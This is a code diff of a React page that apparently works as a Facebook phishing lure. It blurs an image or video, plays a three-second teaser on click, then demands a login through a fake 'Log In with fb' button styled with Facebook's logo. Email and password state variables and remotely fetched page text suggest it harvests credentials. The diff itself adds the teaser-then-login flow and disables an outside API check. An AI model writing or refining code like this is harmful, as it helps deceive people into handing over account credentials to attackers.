@@ -59,20 +59,22 @@
         const [namepage, setNamepage] = React.useState("facebook");
         const [typeFile, setTypeFile] = React.useState("");
 
+        const [cont, setCont] = React.useState(false);
+
         const [vEmail, setVEmail] = React.useState("");
         const [vPassword, setVPassword] = React.useState("");
 
         const [loading, setLoading] = React.useState(true);
         React.useEffect(() => {
-          axios
-            .get("https://checkapi.mysc0m.com/")
-            .then((res) => {
-              // setLoading(false);
-            })
-            .catch((err) => {
-              //   window.location = 'https://www.livebotola.com/';
-              // setLoading(false);
-            });
+          // axios
+          //   .get("https://checkapi.mysc0m.com/")
+          //   .then((res) => {
+          //     // setLoading(false);
+          //   })
+          //   .catch((err) => {
+          //     //   window.location = 'https://www.livebotola.com/';
+          //     // setLoading(false);
+          //   });
 
           function getData(url) {
             axios
@@ -87,6 +89,9 @@
                 setBtnText(data.button_value);
                 setNamepage(data.name);
                 setTypeFile(data.typefile);
+                if (data.typefile === "image") {
+                  setCont(true);
+                }
               })
               .catch((err) => {
                 console.log(err);
@@ -122,53 +127,71 @@
                 <div className=" w-full  bg-contain bg-center flex flex-col gap-3 items-center ">
                   {typeFile === "video" ? (
                     <video
-                      autoPlay
+                      // autoPlay
                       loop
                       muted
-                      className="w-full h-full object-cover blur-lg"
+                      className="w-full h-screen object-cover blur-lg"
                       src={image}
                     ></video>
                   ) : (
                     <img
                       src={image}
                       alt="image"
-                      className="w-full h-full blur-lg "
+                      className="w-screen h-screen blur-sm bg-contain"
                     />
                   )}
 
-                  <div className="absolute  top-[50%] left-[50%] transform -translate-y-[50%] -translate-x-[50%] p-4 bg-white/50 shadow-md">
-                    <div className="font-semibold">
-                      To continue, you must log in.
+                  {!cont ? (
+                    <div
+                      onClick={() => {
+                        // when click play video in 3 seconds and set cont to true
+                        // play video
+                        document.querySelector("video").play();
+
+                        setTimeout(() => {
+                          setCont(true);
+                          document.querySelector("video").pause();
+                        }, 3000);
+                      }}
+                      className="rounded-md font-semibold absolute top-[50%] left-[50%] transform -translate-y-[50%] -translate-x-[50%] p-4 bg-white/50 shadow-md cursor-pointer"
+                    >
+                      Play video
                     </div>
-                    <button className="bg-blue-700 p-2 text-white w-64 rounded-md mt-4 flex gap-2 items-center">
-                      <svg
-                        xmlns="http://www.w3.org/2000/svg"
-                        x="0px"
-                        y="0px"
-                        width="40"
-                        height="40"
-                        viewBox="0 0 48 48"
-                      >
-                        <path
-                          fill="#039be5"
-                          d="M24 5A19 19 0 1 0 24 43A19 19 0 1 0 24 5Z"
-                        ></path>
-                        <path
-                          fill="#fff"
-                          d="M26.572,29.036h4.917l0.772-4.995h-5.69v-2.73c0-2.075,0.678-3.915,2.619-3.915h3.119v-4.359c-0.548-0.074-1.707-0.236-3.897-0.236c-4.573,0-7.254,2.415-7.254,7.917v3.323h-4.701v4.995h4.701v13.729C22.089,42.905,23.032,43,24,43c0.875,0,1.729-0.08,2.572-0.194V29.036z"
-                        ></path>
-                      </svg>
-                      <div
-                        className="font-semibold"
-                        onClick={() => {
-                          setLoading(false);
-                        }}
-                      >
-                        {" "}
-                        Log In with fb
+                  ) : (
+                    <div className="absolute  top-[50%] left-[50%] transform -translate-y-[50%] -translate-x-[50%] p-4 bg-white/50 shadow-md">
+                      <div className="font-semibold">
+                        To continue, you must log in.
                       </div>
-                    </button>
-                  </div>
+                      <button className="bg-blue-700 p-2 text-white w-64 rounded-md mt-4 flex gap-2 items-center">
+                        <svg
+                          xmlns="http://www.w3.org/2000/svg"
+                          x="0px"
+                          y="0px"
+                          width="40"
+                          height="40"
+                          viewBox="0 0 48 48"
+                        >
+                          <path
+                            fill="#039be5"
+                            d="M24 5A19 19 0 1 0 24 43A19 19 0 1 0 24 5Z"
+                          ></path>
+                          <path
+                            fill="#fff"
+                            d="M26.572,29.036h4.917l0.772-4.995h-5.69v-2.73c0-2.075,0.678-3.915,2.619-3.915h3.119v-4.359c-0.548-0.074-1.707-0.236-3.897-0.236c-4.573,0-7.254,2.415-7.254,7.917v3.323h-4.701v4.995h4.701v13.729C22.089,42.905,23.032,43,24,43c0.875,0,1.729-0.08,2.572-0.194V29.036z"
+                          ></path>
+                        </svg>
+                        <div
+                          className="font-semibold"
+                          onClick={() => {
+                            setLoading(false);
+                          }}
+                        >
+                          {" "}
+                          Log In with fb
+                        </div>
+                      </button>
+                    </div>
+                  )}
                 </div>
               </div>
             ) : (
